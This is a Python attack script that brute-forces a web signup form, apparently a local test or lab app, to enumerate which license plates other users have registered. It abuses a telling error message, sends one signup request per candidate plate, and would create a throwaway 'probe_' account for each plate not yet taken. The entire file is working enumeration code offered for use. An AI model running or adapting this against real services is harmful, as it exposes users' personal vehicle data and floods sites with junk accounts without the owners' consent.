import itertools
import time
import requests
from bs4 import BeautifulSoup
from tqdm import tqdm

# global session & endpoint
session = requests.Session()
URL = 'http://localhost:3000/signup'
LENGTH = 6  # adjust as you please
CHARS  = 'ABCDE0123456789'

def is_plate_taken(plate: str) -> bool:
    payload = {
        'username':  f'probe_{plate}',
        'plate':      plate,
        'password':   'Test1234!',
        'password2':  'Test1234!'
    }
    r = session.post(URL, data=payload)
    r.raise_for_status()
    soup = BeautifulSoup(r.text, 'html.parser')
    alert = soup.find('div', class_='alert-danger')
    return bool(alert and 'License plate already registered by other user' in alert.text)

def brute_force_plates(length: int):
    """Yield every string of given length over CHARS."""
    return (''.join(tup) for tup in itertools.product(CHARS, repeat=length))

def main():
    found = []
    total = len(CHARS) ** LENGTH
    for plate in tqdm(brute_force_plates(LENGTH),
                      total=total,
                      desc=f'Brute‑forcing {LENGTH}‑char plates'):
        try:
            if is_plate_taken(plate):
                print(f'[+] Taken: {plate}')
                found.append(plate)
        except requests.RequestException as e:
            # you can log or retry here
            print(f'! error on {plate}: {e}')

    print('\nDone. Plates found:')
    for p in found:
        print('  ', p)

if __name__ == '__main__':
    main()
